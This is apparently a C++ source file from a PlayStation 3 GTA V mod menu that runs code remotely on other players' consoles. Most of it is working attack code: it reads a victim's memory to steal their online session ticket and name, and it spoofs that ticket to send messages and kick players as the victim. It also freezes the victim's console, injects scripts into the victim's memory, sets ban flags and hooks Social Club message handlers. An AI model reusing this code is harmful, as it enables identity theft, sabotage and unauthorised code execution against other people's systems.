				return read32(address);
			}
			static char* ReadString(unsigned int  address, char* str, int len)
			{
				readString(address, str, len);
				return str;
			}
			static void WriteInt32(unsigned int address, int value)
			{

				write32(address, value);
			}
			static void WriteString(unsigned int address, char* value)
			{
				writeString(address, value);
			}
		};
	}

	Outfits::Outfit outfit = Outfits::Outfit();

#pragma endregion


	int parseFloat(float f) {
		int i = *(int*)&f;
		return i;
	}

	int parseString(char* str, int addrOffset = 0) {
		return (int)writeString(0x10024000 + addrOffset, str);
	}


	bool doTestRank = false;

	bool loadOutfitNames = false;
	bool loadCurrentOutfit = false;
	bool saveCurrentOutfit = false;
	bool initOutfits = false;


	int modelSetHash = 0x64611296;
	bool godmodeOn = false;
	bool godmodeOff = false;
	bool copsEnabled = false;
	bool copsDisabled = false;
	bool kickPlayerEnabled = false;
	bool tempBanPlayerEnabled = false;
	//bool requestScriptLoad = false;
	bool injectScript = false;
	bool startScript = false;
	bool stopScript = false;
	bool doInjectScriptIntoMemory = false;
	bool makePlayerKickPlayerEnabled = false;
	bool freezePlayerConsoleEnabled = false;
	bool teleportToYankton = false;
	bool teleportToYacht = false;
	bool doNoWater = false;
	bool removeModMenu = false;
	bool grabTicket = false;
	int makePlayerKickPlayerID = 0;
	int scriptName = 0;
	int scriptStackSize = 0x07E8;//2024
	char* scriptLocation = "/dev_hdd0/tmp/gopro_2027/rock_menu2.csc";
	char setPlayerStatFileLocation[200];
	bool setPlayerStat = false;
	char runNativeFileLocation[200];
	bool runNativeFileBool = false;
	

#ifdef ticketstealcode

	char stolen_rockstarserverinfo[0x2052220 /*0x2051FE4*/ -0x2051598];//idk the size yet...

	void readTicketString() {
		print3("Getting info...", 100000);
		int ticketaddr = 0;
		if (isBLUSVersionOfGame) {
			ticketaddr = 0x20619C8-0x30;//rockstarserverinfo
		}
		else {
			ticketaddr = 0x20515C8-0x30;
		}

		/*int testData[50] = { 0 };
		memset(testData, 0, 50 * 4);
		read(0x1BF85C0, testData, 7);
		printf("Test Data 7: ");
		for (int i = 0; i < 7; i++)
			printf("%X ", testData[i]);
		printf("\n");
		memset(testData, 0, 50 * 4);
		read(0x1BF85C0, testData, 13);
		printf("Test Data 13: ");
		for (int i = 0; i < 13; i++)
			printf("%X ", testData[i]);
		printf("\n");
		memset(testData, 0, 50 * 4);
		read(0x1BF85C0, testData, 3);
		printf("Test Data 3: ");
		for (int i = 0; i < 3; i++)
			printf("%X ", testData[i]);
		printf("\n");*/
		

		read(ticketaddr, (char*)stolen_rockstarserverinfo, sizeof(stolen_rockstarserverinfo)/*0x2052220 - 0x2051598*/, true);
		
		print3("~g~Got the info!",100000);
	}

	char *prev_rockstarserverinfo = (char*)0x10070200;//[0x2052220 - 0x2051598];




	void moreTicketFunctionality() {


		printf("Ticket before send: %s", (void*)0x20515C8);
		printf("\n");

		//memcpy((void*)prev_rockstarserverinfo, (void*)0x2051598, 0x2052220 - 0x2051598);
		//memcpy((void*)0x2051598, (void*)stolen_rockstarserverinfo, sizeof(stolen_rockstarserverinfo));
		/*for (int i = 0; i < sizeof(stolen_rockstarserverinfo); i += 4) {
			if (*(char*)(0x2051598 + i) != 0xD0) {
				*(int*)(0x2051598 + i) = *(int*)((int)stolen_rockstarserverinfo + i);
			}
		}*/


		//repatch the 3 values that change with time but we gon ignore them
		/*
		memcpy((void*)(0x2051598 + 0x2B0), (void*)((unsigned int)prev_rockstarserverinfo + 0x2B0), 0x4);
		memcpy((void*)(0x2051598 + 0x2B0), (void*)((unsigned int)prev_rockstarserverinfo + 0x610), 0x8);
		memcpy((void*)(0x2051598 + 0x628), (void*)((unsigned int)prev_rockstarserverinfo + 0x628), 0x4);*/

		/*printf("Finding differences before:\n");
		for (int i = 0; i < 0xC88; i+=4){
			int a = *(int*)((unsigned int)prev_rockstarserverinfo + i);
			int b = *(int*)((unsigned int)stolen_rockstarserverinfo + i);
			if (a != b) {
				printf("Dif at 0x%X\n",i);
			}
		}*/

		/*
Dif at 0x2B0
Dif at 0x610
Dif at 0x614
Dif at 0x628



Dif at 0x2B0
Dif at 0x610
Dif at 0x614
Dif at 0x628
		*/

		sendRockstarMessageEvent(0, "Test!", true);
		sendKickEvent(playerToDoRCEOn);
		

		print3("Sent!", 10000);

		printf("Ticket I just sent on: %s", (void*)0x20515C8);
		printf("\n");

		/*printf("Finding differences after:\n");
		for (int i = 0; i < 0xC88; i += 4) {
			int a = *(int*)((unsigned int)0x2051598 + i);
			int b = *(int*)((unsigned int)stolen_rockstarserverinfo + i);
			if (a != b) {
				printf("Dif at 0x%X\n", i);
			}
		}*/


		//memcpy((void*)0x2051598, (void*)prev_rockstarserverinfo, 0x2052220 - 0x2051598);
	}



	char stolenTicket[0x200+1];//0x200 is the correct max ticket size
	char stolenTicketSecondaryData[0x80 + 1];
	char playerNameOfStolenTicket[20+1];
	bool hasATicket = false;
	char origTicket[0x200];
	bool isCurrentlySpoofed = false;
	void readTicketString() {
		int ticketaddr = 0;
		if (isBLUSVersionOfGame) {
			ticketaddr = 0x20619C8;
		}
		else {
			ticketaddr = 0x20515C8;
		}
		readString(ticketaddr, stolenTicket, sizeof(stolenTicket)-1);
		readString(ticketaddr + 0x200, stolenTicketSecondaryData, sizeof(stolenTicketSecondaryData) - 1);
		readString(ticketaddr - 0x28, playerNameOfStolenTicket, sizeof(playerNameOfStolenTicket) - 1);
		hasATicket = true;
		isCurrentlySpoofed = false;//i mean... idk just figured id pop this here 
		printf("Scraped Ticket Info:\n");
		printf("Name: %s\n", playerNameOfStolenTicket);
		printf("Ticket: %s", stolenTicket);
		printf("\n");
		printf("Ticket SD: %s", stolenTicketSecondaryData);
		printf("\n");
	}

	void printCurrentTicket() {
		printf("Current Ticket A: %s", (void*)0x20515C8);
		printf("\n");
		unsigned int addrTicket2 = 0x20515C8 - 0x30 + 0x690;
		printf("Current Ticket B: %s", addrTicket2);
		printf("\n");
	}

	void miscTicketFunction() {


		printf("Ticket before send (not spoofed): %s", (void*)0x20515C8);
		printf("\n");

		//spoof my ticket
		memcpy(origTicket, (void*)0x20515C8, 0x200);
		memcpy((void*)0x20515C8, stolenTicket, 0x200);
		memcpy((void*)(0x20515C8+0x200), stolenTicketSecondaryData, 0x80);
		//memcpy((void*)(0x20515C8-0x28), playerNameOfStolenTicket, 20);  //seems to make it invalid
		unsigned int addrTicket2 = 0x20515C8 - 0x30 + 0x690;//this is like the server one... idk lol
		memcpy((void*)addrTicket2, stolenTicket, 0x200);
		memcpy((void*)(addrTicket2 + 0x200), stolenTicketSecondaryData, 0x80);
		//memcpy((void*)(addrTicket2 - 0x28), playerNameOfStolenTicket, 20); not actually a name here oops so crash

		if (strstr((char*)0x20515C8, stolenTicket) != 0) {//valid pointer, stolenticket is found within running ticket
			//sendKickEvent(playerToDoRCEOn);
			sendRockstarMessageEvent(0, "Test", true);

			static char buf[50];
			snprintf(buf, sizeof(buf), "~g~Sent message from ~b~%s", playerNameOfStolenTicket);

			print3(buf,10000);
		}
		else {
			print3("~r~Error!",10000);
		}

		printf("Ticket I just sent on: %s", (void*)0x20515C8);
		printf("\n");

		//unspoof my ticket
		//memcpy((void*)0x20515C8, origTicket, 0x200);
	}

	

	
	
#ifdef spoofticketthings
	void spoofTicket() {
		if (hasATicket == false) {
			print3("~r~Must 'Scrape User Info' first!",10000);
			return;
		}
		if (isCurrentlySpoofed == true) {
			print3("You are already spoofed! Please unspoof first");
			return;
		}
		static char buf[50];
		snprintf(buf, sizeof(buf), "Spoofed to ~b~%s", playerNameOfStolenTicket);
		print3(buf,10000);
		printf("Current Ticket (before spoof): %s", (char*)0x20515C8);
		printf("\n");
		memcpy(origTicket, (void*)0x20515C8, 0x200);
		memcpy((void*)0x20515C8, stolenTicket, 0x200);
		isCurrentlySpoofed = true;
	}

	void unspoofTicket() {
		if (hasATicket == false) {
			print3("~r~Must 'Scrape User Info' first!", 10000);
			return;
		}
		if (isCurrentlySpoofed == false) {
			print3("You are not spoofed! Please spoof first");
			return;
		}
		isCurrentlySpoofed = false;
		printf("Current Ticket (unspoof): %s\n", (char*)0x20515C8);
		if (strstr((char*)0x20515C8, stolenTicket) == 0) {
			print3("~r~WARNING. YOUR INFO WAS RESET AT SOME POINT AND WAS UNSPOOFED BY THE GAME ALREADY");
			return;
		}
		memcpy((void*)0x20515C8, origTicket, 0x200);
		print3("~g~Unspoofed!");
	}

	void adminKickBanTest() {
		//readTicketString()  maybe add this later so we have 1 nice little option :) just think about threading! This can't be in same thread as others and nice verce
		unspoofTicket();//unspoof first so we make sure we get a fresh one
		spoofTicket();
		if (isCurrentlySpoofed) {
			if (strstr((char*)0x20515C8, stolenTicket) != 0) {//valid pointer, stolenticket is found within running ticket
				sendKickEvent(playerToDoRCEOn);
				unspoofTicket();
				print3("~g~Done!");
			}
			else {
				print3("~r~ERROR 2");
			}
		}
		else {
			print3("~r~ERROR");
		}
	}
#endif
#endif
	float itof(int i) {
		return *(float*)&i;
	}
	void setPlayerStatFunc(int type,int stat, int value) {
		if (type == 0)//int
			callNative(STAT_SET_INT, stat, value, 1);
		if (type == 1)//bool
			callNative(STAT_SET_BOOL, stat, value, 1);
		if (type == 2)//float
			callNative(STAT_SET_FLOAT, stat, itof(value), 1);
	}
	
	void Thread(uint64_t nothing) {
		int scriptIDSave = 0;
		while (true) {

			if (readyForFinalRCE == true && PLAYER_VALID(playerToDoRCEOn)) {
				
				

#ifdef ticketstealcode

				if (grabTicket) {
					print("Working...\nThis can take 1 minute",1000000);
					readTicketString();
					//print("~g~Done scraping user info!",10000);
					grabTicket = false;
				}

#endif

				//if (grabTicket) {
				//	print("Working...\nThis can take a minute", 1000000);
				//	readTicketString();
				//	print("~g~Done scraping user info!",100000);
				//	grabTicket = false;
				//}


				if (removeModMenu) {
					printPlayer("~r~Mod Menu Disabled By Paradise!");
					int val = 0x10FA0;//blr    //*(int*)0x1C2BB88;//IS_PLAYER_LOGGING_IN_NP function address
					if (isBLUSVersionOfGame) {
						//blus addresses
						//0x1C3BD90
						//0x1C38CB0
						write32(0x1C3BD90, 0x11420);//IS_PLAYER_ONLINE
						write32(0x1C38CB0, 0x11420);//NETWORK_IS_SIGNED_ONLINE
					}
					else {
						write32(0x1C2BB80, val);//IS_PLAYER_ONLINE
						write32(0x1C28AA0, val);//NETWORK_IS_SIGNED_ONLINE
					}
					print("~g~Remove attempted!");
					
					removeModMenu = false;
				}

				if (setPlayerStat) {
					print3("~g~Stats Set!");
					runStatFile(setPlayerStatFileLocation, setPlayerStatFunc);
					setPlayerStat = false;
				}

				if (runNativeFileBool) {
					print3("Running...");
					//runNativeFile(runNativeFileLocation, callNative);//runNativeFile is incomplete inside of it
					runNativeFileBool = false;
				}

				if (initOutfits) {
					bool b = outfit.Init(!isBLUSVersionOfGame);
					if (!b)
						print3("~r~OUTFIT ERROR",10000);
					initOutfits = false;
				}

				if (doNoWater) {


					unsigned int waterPoolAddress = read32(isBLUSVersionOfGame ? 0x21D9048/*BLUS*/ : 0x21C8C48)/*0x021C8848 old*/;
					int arr[maxIntsPerPacket] = {0};
					write_sixOrLess(waterPoolAddress, arr, 0x5994/4);
					print3("~g~Water Removed!"); 
					printPlayer("~g~Ocean Water Removed!");
					doNoWater = false;
				}

				if (loadOutfitNames) {
					if (outfit.inited) {
						for (int i = 0; i < GetOutfitsCount(); i++)
							outfit.GetOutfitName(i);
						//rtmThread::outfit.outfitNames[i]
						print3("~g~Outfit names loaded");
					}
					else {
						print3("~r~OUTFIT ERROR", 10000);
					}
					loadOutfitNames = false;
				}
				if (loadCurrentOutfit) {
					if (outfit.inited) {
						outfit.Fetch(outfit.currentOutfit);
						print3("~g~Outfit data loaded");
					}
					else {
						print3("~r~OUTFIT ERROR", 10000);
					}
					loadCurrentOutfit = false;
				}
				if (saveCurrentOutfit) {
					if (outfit.inited) {
						outfit.Poke(outfit.currentOutfit);
						print3("~g~Outfit data saved");
					}
					else {
						print3("~r~OUTFIT ERROR", 10000);
					}
					saveCurrentOutfit = false;
				}

				if (doTestRank) {
					//callNative(STAT_SET_INT,GAMEPLAY::GET_HASH_KEY("MP0_CHAR_XP_FM"),999,1);
					//callNative(STAT_SET_INT,GAMEPLAY::GET_HASH_KEY("MP1_CHAR_XP_FM"),999,1);
					int hash = modelSetHash;
					//printf("Alien hash: 0x%X\n", hash);
					callNative(REQUEST_MODEL, hash);
					//printf("Requested it\n");
					int timer = 0;
					while (!callNative(HAS_MODEL_LOADED, hash)) { sleep(1); timer++; if (timer > 5000) { break; } }
					//printf("It is now loaded\n");
					callNative(SET_PLAYER_MODEL, playerToDoRCEOn, hash);
					//printf("Set the weird\n");
					doTestRank = false;
					if (timer > 5000)
						print("Error loading model!");
					else
						print("~g~Set!");
				}
				if (godmodeOn) {
					callNative(SET_PLAYER_INVINCIBLE, callNative(PLAYER_ID), true);
					printPlayer("Godmode ~g~Enabled");
					godmodeOn = false;
				}
				if (godmodeOff) {
					callNative(SET_PLAYER_INVINCIBLE, callNative(PLAYER_ID), false);
					printPlayer("Godmode ~r~Disabled");
					godmodeOff = false;
				}
				if (copsDisabled) {
					callNative(SET_WANTED_LEVEL_MULTIPLIER, 0);
					printPlayer("Cops ~g~Disabled");
					copsDisabled = false;
				}
				if (copsEnabled) {
					callNative(SET_WANTED_LEVEL_MULTIPLIER, 0x3F800000);
					printPlayer("Cops ~r~Enabled");
					copsEnabled = false;
				}
				if (tempBanPlayerEnabled) {

					//This only affects the UI. It resets on a game reload


					//int notbanned = 0x006FCF7E;
					//int banned =    0x006FCFFE;
					unsigned int addr = isBLUSVersionOfGame ? 0x20619C8 + 0x410/*BLUS*/ : 0x20515C8 + 0x410;
					int baseVal = read32(addr);
					int banned = baseVal | 0x80;
					write32(addr, banned);


					
					print3("Player banned!");

					tempBanPlayerEnabled = false;
				}
				if (kickPlayerEnabled) {
					//This doesn't work at all... Do I know why? No lmao
					callNative(NETWORK_SESSION_KICK_PLAYER, playerToDoRCEOn/*callNative(PLAYER_ID)*/);
					kickPlayerEnabled = false;
				}
				if (makePlayerKickPlayerEnabled) {
					static char buf[200];
					if (callNative(NETWORK_IS_HOST)) {
						callNative(NETWORK_SESSION_KICK_PLAYER, makePlayerKickPlayerID);
						print3("Kicked player successfully!");
					}
					else {
						snprintf(buf,sizeof(buf),"~r~Initialized player is not host! Please initialize on ~y~%s", PlayerMods::getHost());
						print3(buf);
					}
					makePlayerKickPlayerEnabled = false;
				}
				if (freezePlayerConsoleEnabled) {
					freezePlayerConsoleEnabled = false;
					print3("~r~Player's Console Frozen");
					//write32(8, 50);//just tries to write 50 to address 8
					if (isBLUSVersionOfGame) {
						write32(0x1C3BD90, 50);
					}
					else {
						write32(0x1C2BB80, 50);
					}
				}


				/*if (requestScriptLoad) {
					//Not used anymore

					print("Requesting script...", 99999);
					scriptName = writeString(0x10024000, "fm_deathmatch_creator");
					//PS3dotSetMemory(0x10025000,"fm_deathmatch_creator",strlen("fm_deathmatch_creator"));
					//scriptName = 0x10025000;
					//char *tst = "djhfgiuhdriufghdriuvhbderiuigheuirygufgh3478hf7834hg783h45tg783h45tg78th378fgtyh34uihuierygueryguiverhviuerygfiuveryng8n734y78435ynfgn7834y7f834b7g87bf3748n7gf78e947gf983547g8973e5489gn7e5r98g78er89g7889er7guvfgn89er78g89347g89783re489g7e398tg7438e9rg789347894eg798e43rg7fe8m9rg789ne3r7g893r47g893r4e7g89erm7ge89rv7re398g7n34897f8m934yutfg789eh4rf79ch3489fuy8934uyg8934ug8934ug83489_HAHAabcd123";
					//PS3dotSetMemory(0x10045028,tst,strlen(tst));
					callNative(REQUEST_SCRIPT, scriptName);
					//printf("Script at 0x%X\n",(uint)getN4rage10scrProgramE(GAMEPLAY::GET_HASH_KEY("fm_deathmatch_creator")));
					requestScriptLoad = false;
					print("~g~Requested script!", 10000);
				}*/

				if (doInjectScriptIntoMemory) {
					print("Copying script into their memory...", 999999999);
					printPlayer("Copying menu to your system...\nThis will take some time.");
					//int timeStart = time(0);
					//printf("Fuck it's starting\n"); 
					injectScriptIntoMemory(scriptLocation/*"/dev_hdd0/tmp/gopro_2027/rock_menu2.csc"*/);
					//int timeEnd = time(0);
					//int timeDif = timeEnd-timeStart;
					//printf("Time it took to copy menu to their system: %i\n",timeDif);
					print("~g~Done copying script into their memory!", 999999999);
					printPlayer("Menu copied! Wait for inject.");
					doInjectScriptIntoMemory = false;
				}
				if (injectScript) {

					print("Injecting script...", 9999999);

					scriptName = writeString(0x10024000, "fm_deathmatch_creator");
					callNative(REQUEST_SCRIPT, scriptName);


					int counter = 0;
					while (!callNative(HAS_SCRIPT_LOADED, scriptName)) {
						callNative(REQUEST_SCRIPT, scriptName);
						sleep(1000);
						counter++;
						if (counter > 10)
							break;//more than 10 seconds to break
					}

					
					if (callNative(HAS_SCRIPT_LOADED, scriptName)) {
						injectAlreadyInjectedFile(scriptLocation/*"/dev_hdd0/tmp/gopro_2027/rock_menu2.csc"*/, true, 0xa57e7489);
						print("~g~Script Injected!", 10000);
					}
					else {
						print("~r~Script unable to load!\nPlease try again", 10000);
					}

					injectScript = false;
				}
				
				/*if (injectScript) {

					printf("Injecting script...\n");
					if (callNative(HAS_SCRIPT_LOADED,scriptName)){
						inject("/dev_hdd0/tmp/gopro_2027/rock_menu2.csc",true,0xa57e7489/"fm_deathmatch_creator"/);
						printf("Done Injecting!!!!!!!!!!!!!!!!!!!!!!!!!\n");
					} else {
						printf("Not loaded yet\n");
					}

					injectScript = false;
				}*/
				if (startScript) {
					//if (scriptIDSave == 0) {
					print("Starting script...");
					//SYSTEM::START_NEW_SCRIPT("stripclub_mp", 0x07E8);
					//callNative(TERMINATE_ALL_SCRIPTS_WITH_THIS_NAME,scriptName);
					
					print("~g~Script Started!");
					char menu[1];
					int o = openFile("/dev_hdd0/tmp/gopro_2027/injmenu.dat");
					readFile(o, menu, 1, 0);
					closeFile(o);

					if (menu[0] == RCEMenu_CUSTOMSCRIPT) {
						printPlayer("Mod menu injected!\nAsk modder how to open!");
					}
					if (menu[0] == RCEMenu_VCAHax) {
						printPlayer("VCAHax Mod menu injected!\nL1 + Dpad Down to open!");
						scriptStackSize = 1024;
					}
					if (menu[0] == RCEMenu_APII) {
						printPlayer("AP II Intense Mod menu injected!\nR1 + Square to open!");
						scriptStackSize = 2024;
					}
					if (menu[0] == RCEMenu_Paradise) {
						printPlayer("Paradise Micro Mod menu injected!\nDpad Right + Square to open!");
						scriptStackSize = 1024;
					}


					scriptIDSave = callNative(START_NEW_SCRIPT, scriptName, scriptStackSize);
					startScript = false;

					//} else {
					//	print("~r~ERROR: Script already running!");
					//}
				}

				


				if (teleportToYankton) {
					print("Loading and Teleporting to North Yankton...",100000);


					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01c"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01d"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01e"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01f"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01g"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01h"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01i"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01j"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01k"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue01z"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue02"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue03"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue03b"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue03_grv_fun"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue04"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue04b"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue05"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue05b"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue06"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue06b"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue06_int"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologuerd"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologuerdb"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue_DistantLights"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue_LODLights"));
					callNative(REQUEST_IPL, writeString(0x10024000, "prologue_m2_door"));

					//3547.1920,-4675.1490,114.1681
					callNative(SET_ENTITY_COORDS, callNative(PLAYER_PED_ID), parseFloat(3547.1920), parseFloat(-4675.1490), parseFloat(114.1681), 1, 1, 1);

					print("~g~Teleported!");

					teleportToYankton = false;
				}

				if (teleportToYacht) {
					print("Loading and Teleporting to Yacht...", 100000);

					callNative(REQUEST_IPL, parseString("hei_yacht_heist"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_Bar"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_Bedrm"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_Bridge"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_DistantLights"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_enginrm"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_LODLights"));
					callNative(REQUEST_IPL, parseString("hei_yacht_heist_Lounge"));

					//-2043.974,-1031.582, 11.981
					callNative(SET_ENTITY_COORDS, callNative(PLAYER_PED_ID), parseFloat(-2043.974), parseFloat(-1031.582), parseFloat(11.981), 1, 1, 1);

					print("~g~Teleported!");

					teleportToYacht = false;
				}

				/*
				//no terminate function in freemode :(
				if (stopScript) {
					if (scriptIDSave != 0) {

						callNative(TERMINATE_THREAD,scriptIDSave);//for ones with mis matching names
						scriptIDSave = 0;
						print("~g~Script Terminated!");
					} else {
						print("~r~ERROR: Script not running!");
					}
				}*/
			}

			if (abortAllCalls)
				abortAllCalls = false;

			sleep(1000);
		}
	}








};


uint64_t socialclub_logger(uint64_t arg1, uint64_t arg2) {
	//arg2 is N4rage24rlPresenceEventScMessage

	//begin of check... a simpler way to do this would be just to check that each pointer in jsonString is valid, but I decided to do this instead cuz this is how it's done on the ps3 before it grabs the json string
	int compare1 = call<int>(*(int*)*(int*)*(int*)arg2)();
	int compare2 = *(int*)0x2002488;
	if (compare1 != compare2)
		return compare1;
	//end of check

	char* jsonString = (char*)*(unsigned int*)(*(unsigned int*)(*(unsigned int*)(arg2 + 0x4) + 0xC0) + 0x8);//this needs to be changed on pc
	printf("Received from social club: %s\n", jsonString);
	return call<uint64_t>(0x13AAB94)(arg1, arg2);
}

void socialclub_logger_setup() {
	*(uint64_t*)0x1C72288 = *(uint64_t*)((uint64_t)socialclub_logger);
}





//player joiner

struct CFriendsMenu {
	char padding[0x44];
	char name[0x14];//0x44
	char region[0x8];//0x58
};

//CFriendsMenu data from a friend who was online and playing gta in a joinable lobby
int CFriendsMenuData[] = { 0x0189DA70, 0x32352DF8, 0x32F49600, 0x00000000, 0x05060000, 0x3121BB90, 0x000A000B, 0x99EF65A4, 0x00000193, 0x000000C7, 0x00000000, 0x00010000, 0x00000C04, 0x00000000, 0x00000000, 0x00000002, 0x00000000, 0x42656C6C, 0x615F426F, 0x79645631, 0x00000000, 0x00000000, 0x62356E7A, 0x70733300, 0x01000000, 0x00000000, 0x02000000, 0x00000000, 0x01000000, 0x01000000, 0x00000101, 0x01000000, 0x01000100, 0x03000000, 0x00000000, 0xFFFFFF9B, 0x0000792A, 0xFFFFFFFF, 0x00000018, 0x00000000, 0x018107AC, 0x00000000, 0x00000000, 0x3318D000, 0x00100010, 0x0189D738, 0x327C2530, 0x00010001, 0x32F49600, 0x00000000, 0x00000010, 0x00000000, 0x00000059, 0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00010000, 0x3375B950, 0x320F9710, 0x00000000, 0x00000000, 0x00000000 };
CFriendsMenu* globalFriend = (CFriendsMenu*)CFriendsMenuData;
void joinPlayer(char* playerName) {
	*(int*)0x10D6E0 = 0x38800002;
	strncpy(globalFriend->name, playerName, 0x14);
	printf("About to join player %s\n", playerName);
	call<int>(0x10D6BC)(globalFriend, 0/*0xDA4858C1*//*hash for join player*/);
	//10D6BC joinFriend might also work as a function
	printf("Joining player %s\n", playerName);
}

bool spoofJoinRequest = false;
char spoofJoinRequestName[0x14];

int joinCFriendsMenu_hook(CFriendsMenu* fr, unsigned int hash) {
	if (hash == 0xDA4858C1) {
		//join request
		if (spoofJoinRequest) {
			if (VALID_ADDR(fr)) {
				strncpy(fr->name, spoofJoinRequestName, 0x14);
				printf("Spoofed! %s\n", fr->name);
			}
		}
	}
	return call<int>(0x10D9A8)(fr, hash);
}

void joinCFriendsMenu_setup() {
	*(ui64*)(0x1C15E48) = *(ui64*)((int)joinCFriendsMenu_hook);
}





void spoofPlayerIDAsMeForHost(int actualHostPlayerAkaMe) {
	//crash
	int CNetworkPlayerMgr = 0x1CF72BC;
	int addr = CNetworkPlayerMgr + actualHostPlayerAkaMe * 4 + 0xDC;
	addr = *(int*)addr + 0x6C;
	*(char*)addr = 0xE0;//set it to say it is them...
}